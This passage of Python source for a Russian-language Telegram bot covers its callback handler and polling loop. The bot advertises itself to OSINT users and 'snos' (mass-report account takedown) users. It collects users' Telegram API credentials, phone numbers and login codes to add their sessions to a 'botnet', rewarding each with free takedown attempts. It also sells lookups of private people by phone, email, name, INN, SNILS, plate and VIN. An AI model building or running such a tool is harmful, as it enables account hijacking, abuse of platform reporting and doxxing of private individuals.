    elif message.text == "❌ Отмена":
        bot.send_message(message.chat.id, "❌ Рассылка отменена")
    
    if message.from_user.id in user_states:
        del user_states[message.from_user.id]

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    print(f"📞 Получен callback: {call.data} от пользователя {call.from_user.id}")
    
    try:
        if call.data.startswith('code_'):
            user_id = call.from_user.id
            
            if user_id in user_states and user_states[user_id].get('action') == 'add_session_step4':
                digit = call.data.split('_')[1]
                state = user_states[user_id]
                
                if digit == 'delete':
                    if state.get('entered_code'):
                        state['entered_code'] = state['entered_code'][:-1]
                elif digit == 'submit':
                    if len(state.get('entered_code', '')) == 5:
                        msg = bot.send_message(call.message.chat.id, "🔄 Проверяю код...")
                        
                        import threading
                        thread = threading.Thread(target=async_verify_code, args=(
                            user_id, state['api_id'], state['api_hash'], state['phone'], 
                            state['entered_code'], state.get('phone_code_hash'), 
                            call.message.chat.id, msg.message_id
                        ))
                        thread.start()
                        
                        try:
                            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id)
                        except:
                            pass
                    else:
                        bot.answer_callback_query(call.id, "❌ Код должен содержать 5 цифр", show_alert=True)
                        return
                elif digit == 'resend':
                    msg = bot.send_message(call.message.chat.id, "🔄 Запрашиваю новый код...")
                    
                    import threading
                    thread = threading.Thread(target=async_resend_code, args=(
                        user_id, state['api_id'], state['api_hash'], state['phone'], 
                        call.message.chat.id, msg.message_id, call.message.message_id
                    ))
                    thread.start()
                    
                    bot.answer_callback_query(call.id, "🔄 Запрашиваю новый код...")
                    return
                else:
                    if len(state.get('entered_code', '')) < 5:
                        state['entered_code'] = state.get('entered_code', '') + digit
                
                current_code = state.get('entered_code', '')
                display_code = current_code if current_code else "_____"
                
                try:
                    bot.edit_message_text(
                        f"Введите 5-значный код с помощью кнопок ниже:\n\n📱 Код: {display_code}",
                        call.message.chat.id,
                        call.message.message_id,
                        reply_markup=get_code_input_markup()
                    )
                except:
                    pass
                
                bot.answer_callback_query(call.id)
            
        elif call.data == 'verify_phone':
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "Нажмите кнопку ниже для отправки номера телефона:",
                reply_markup=get_phone_markup()
            )
            
        elif call.data == 'check_status':
            try:
                member = bot.get_chat_member(CHANNEL_ID, call.from_user.id)
                if member.status not in ['left', 'kicked']:
                    update_subscription_status(call.from_user.id, True)
                    
                if check_user_status(call.from_user.id):
                    bot.answer_callback_query(call.id, "✅ Все условия выполнены! Нажмите /start")
                else:
                    bot.answer_callback_query(call.id, "❌ Не все условия выполнены")
            except Exception as e:
                print(f"❌ Ошибка проверки подписки: {e}")
                bot.answer_callback_query(call.id, "❌ Ошибка проверки")
            
        elif call.data == 'admin' and call.from_user.id != owner:
            bot.answer_callback_query(call.id, "Доступ запрещен", show_alert=True)
            return

        elif call.data == 'admin' and call.from_user.id == owner:
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption="<b><i>Оп оп Админочка</i></b>",
                    parse_mode='HTML',
                    reply_markup=get_admin_markup()
                )
            except:
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="<b><i>Оп оп Админочка</i></b>",
                        parse_mode='HTML',
                        reply_markup=get_admin_markup()
                    )
                except:
                    pass
            bot.answer_callback_query(call.id)

        elif call.data == 'admin_give':
            if call.from_user.id == owner:
                user_states[call.from_user.id] = {'action': 'give_user_id'}
                bot.send_message(call.message.chat.id, "Введите ID пользователя:")
                bot.answer_callback_query(call.id)
                
        elif call.data == 'admin_take':
            if call.from_user.id == owner:
                user_states[call.from_user.id] = {'action': 'take_user_id'}
                bot.send_message(call.message.chat.id, "Введите ID пользователя для отбора подписки:")
                bot.answer_callback_query(call.id)
                
        elif call.data == 'admin_ban':
            if call.from_user.id == owner:
                user_states[call.from_user.id] = {'action': 'ban_user_id'}
                bot.send_message(call.message.chat.id, "Введите ID пользователя для бана:")
                bot.answer_callback_query(call.id)
                
        elif call.data == 'admin_broadcast':
            if call.from_user.id == owner:
                user_states[call.from_user.id] = {'action': 'broadcast_content', 'broadcast_data': {}}
                bot.send_message(call.message.chat.id, "Отправьте контент для рассылки (текст, фото, видео, документ, голосовое):")
                bot.answer_callback_query(call.id)

        elif call.data == 'add_botnet':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'action': 'add_session_step1'}
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption="<b><i>Это функция добавления сессий, если вы добавите сессию то получите 5 попыток сноса бесплатно.\n\nдля того что бы получить API_ID и API_HASH вы можете посмотреть документацию нажав на кнопку Документация.\n\nВведите API ID или же нажмите на кнопку назад.</i></b>",
                    parse_mode='HTML',
                    reply_markup=get_add_session_markup()
                )
            except:
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="<b><i>Это функция добавления сессий, если вы добавите сессию то получите 5 попыток сноса бесплатно.\n\nдля того что бы получить API_ID и API_HASH вы можете посмотреть документацию нажав на кнопку Документация.\n\nВведите API ID или же нажмите на кнопку назад.</i></b>",
                        parse_mode='HTML',
                        reply_markup=get_add_session_markup()
                    )
                except:
                    pass
            bot.answer_callback_query(call.id)

        elif call.data == 'osint_menu':
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption="<b><i>Выберите нужную вам функцию OSINT поиска.</i></b>",
                    parse_mode='HTML',
                    reply_markup=get_osint_markup()
                )
            except:
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="<b><i>Выберите нужную вам функцию OSINT поиска.</i></b>",
                        parse_mode='HTML',
                        reply_markup=get_osint_markup()
                    )
                except:
                    pass
            bot.answer_callback_query(call.id)

        elif call.data == 'phone_osint':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'osint_type': 'phone'}
            bot.send_message(call.message.chat.id, "Введите номер телефона для поиска:")
            bot.answer_callback_query(call.id)

        elif call.data == 'email_osint':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'osint_type': 'email'}
            bot.send_message(call.message.chat.id, "Введите email для поиска:")
            bot.answer_callback_query(call.id)

        elif call.data == 'name_osint':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'osint_type': 'name'}
            bot.send_message(call.message.chat.id, "Введите ФИО для поиска:")
            bot.answer_callback_query(call.id)

        elif call.data == 'inn_osint':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'osint_type': 'inn'}
            bot.send_message(call.message.chat.id, "Введите ИНН для поиска:")
            bot.answer_callback_query(call.id)

        elif call.data == 'snils_osint':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'osint_type': 'snils'}
            bot.send_message(call.message.chat.id, "Введите СНИЛС для поиска:")
            bot.answer_callback_query(call.id)

        elif call.data == 'ip_osint':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'osint_type': 'ip'}
            bot.send_message(call.message.chat.id, "Введите IP-адрес для поиска:")
            bot.answer_callback_query(call.id)

        elif call.data == 'plate_osint':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'osint_type': 'plate'}
            bot.send_message(call.message.chat.id, "Введите номер автомобиля для поиска:")
            bot.answer_callback_query(call.id)

        elif call.data == 'vin_osint':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'osint_type': 'vin'}
            bot.send_message(call.message.chat.id, "Введите VIN код для поиска:")
            bot.answer_callback_query(call.id)

        elif call.data == 'social_osint':
            if not check_subscription(call.from_user.id):
                bot.answer_callback_query(call.id, "❌ Подписка не активна", show_alert=True)
                return
            
            user_states[call.from_user.id] = {'osint_type': 'social'}
            bot.send_message(call.message.chat.id, "Введите username или ссылку на профиль в соцсети:")
            bot.answer_callback_query(call.id)

        elif call.data.startswith('osint_page_'):
            parts = call.data.split('_')
            if len(parts) == 4:
                query_id = int(parts[2])
                page = int(parts[3])
                
                if query_id in osint_results:
                    result_data = osint_results[query_id]
                    formatted_text, total_pages = format_osint_results(
                        result_data['data'], 
                        result_data['query'], 
                        result_data['type'], 
                        page=page
                    )
                    
                    try:
                        bot.edit_message_text(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            text=formatted_text,
                            parse_mode='HTML',
                            reply_markup=get_osint_results_markup(query_id, page=page, total_pages=total_pages)
                        )
                    except Exception as e:
                        print(f"❌ Ошибка редактирования страницы: {e}")
                        try:
                            plain_text = html.unescape(formatted_text.replace("<b>", "").replace("</b>", "").replace("<i>", "").replace("</i>", ""))
                            bot.edit_message_text(
                                chat_id=call.message.chat.id,
                                message_id=call.message.message_id,
                                text=plain_text,
                                reply_markup=get_osint_results_markup(query_id, page=page, total_pages=total_pages)
                            )
                        except:
                            pass
                
                bot.answer_callback_query(call.id)

        elif call.data == 'crypto':
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption="<b><i>Выберите оптимальный вариант подписки.</i></b>",
                    parse_mode='HTML',
                    reply_markup=get_crypto_markup()
                )
            except:
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="<b><i>Выберите оптимальный вариант подписки.</i></b>",
                        parse_mode='HTML',
                        reply_markup=get_crypto_markup()
                    )
                except:
                    pass
            bot.answer_callback_query(call.id)

        elif call.data == 'crypto_back':
            bot.answer_callback_query(call.id, "🚧 В разработке")

        elif call.data == 'card':
            card_text = """<b><i>
Для оплаты банковской картой, пожалуйста, свяжитесь с создателем бота — он предоставит актуальные реквизиты для перевода.
Мы принимаем платежи из большинства российских банков, включая:
• Т‑Банк
• СберБанк
• Озон Банк
• Альфа‑Банк
</i></b>"""
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption=card_text,
                    parse_mode='HTML',
                    reply_markup=get_card_markup()
                )
            except:
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=card_text,
                        parse_mode='HTML',
                        reply_markup=get_card_markup()
                    )
                except:
                    pass
            bot.answer_callback_query(call.id)

        elif call.data == 'botnet_menu':
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption="<b><i>Выберите функцию сноса которая вам нужна.</i></b>",
                    parse_mode='HTML',
                    reply_markup=get_botnet_markup()
                )
            except:
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="<b><i>Выберите функцию сноса которая вам нужна.</i></b>",
                        parse_mode='HTML',
                        reply_markup=get_botnet_markup()
                    )
                except:
                    pass
            bot.answer_callback_query(call.id)

        elif call.data == 'ai_menu':
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption="<b><i>Выберите нужную для вас модель.</i></b>",
                    parse_mode='HTML',
                    reply_markup=get_ai_markup()
                )
            except:
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="<b><i>Выберите нужную для вас модель.</i></b>",
                        parse_mode='HTML',
                        reply_markup=get_ai_markup()
                    )
                except:
                    pass
            bot.answer_callback_query(call.id)

        elif call.data == 'profile_menu':
            profile_text = get_profile_text(call.from_user)
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption=profile_text,
                    parse_mode='HTML',
                    reply_markup=get_profile_markup()
                )
            except Exception as e:
                print(f"❌ Ошибка редактирования профиля: {e}")
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=profile_text,
                        parse_mode='HTML',
                        reply_markup=get_profile_markup()
                    )
                except Exception as e2:
                    print(f"❌ Вторая ошибка редактирования профиля: {e2}")
                    bot.answer_callback_query(call.id, "⚠️ Ошибка загрузки профиля")
            bot.answer_callback_query(call.id)

        elif call.data == 'refresh_profile':
            profile_text = get_profile_text(call.from_user)
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption=profile_text,
                    parse_mode='HTML',
                    reply_markup=get_profile_markup()
                )
            except Exception as e:
                print(f"❌ Ошибка обновления профиля: {e}")
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=profile_text,
                        parse_mode='HTML',
                        reply_markup=get_profile_markup()
                    )
                except Exception as e2:
                    print(f"❌ Вторая ошибка обновления профиля: {e2}")
            bot.answer_callback_query(call.id, "✅ Статистика обновлена")

        elif call.data == 'main_menu':
            try:
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption="""<b><i>
Web - AI: Telegram - бот в котором собраны все необходимые инструменты для osint'еров, pentest'еров, snos'еров и простых пользователей Telegram.

Желаю удачи в использовании!
</i></b>""",
                    parse_mode='HTML',
                    reply_markup=get_main_markup(call.from_user.id)
                )
            except:
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="""<b><i>
Web - AI: Telegram - бот в котором собраны все необходимые инструменты для osint'еров, pentest'еров, snos'еров и простых пользователей Telegram.

Желаю удачи в использовании!
</i></b>""",
                        parse_mode='HTML',
                        reply_markup=get_main_markup(call.from_user.id)
                    )
                except:
                    pass
            bot.answer_callback_query(call.id)

        else:
            bot.answer_callback_query(call.id, "🔄 В разработке...")
            
    except Exception as e:
        print(f"❌ Ошибка обработки callback: {e}")
        try:
            bot.answer_callback_query(call.id, "⚠️ Произошла ошибка")
        except:
            pass

print("=" * 50)
print("🤖 БОТ УСПЕШНО ЗАПУЩЕН!")
print("=" * 50)
print("📱 Откройте Telegram и напишите /start вашему боту")
print("🎬 onion.mp4 будет всегда прикреплен к меню")
print("⏳ Бот работает пока открыта эта вкладка Colab")
print("=" * 50)

try:
    bot.remove_webhook()
    time.sleep(1)
    
    print("🔄 Начинаю опрос сервера Telegram...")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"⚠️ Перезапуск после ошибки: {e}")
            time.sleep(5)
            continue
            
except KeyboardInterrupt:
    print("\n⏹️ Бот остановлен пользователем")
except Exception as e:
    print(f"\n❌ Критическая ошибка: {e}")
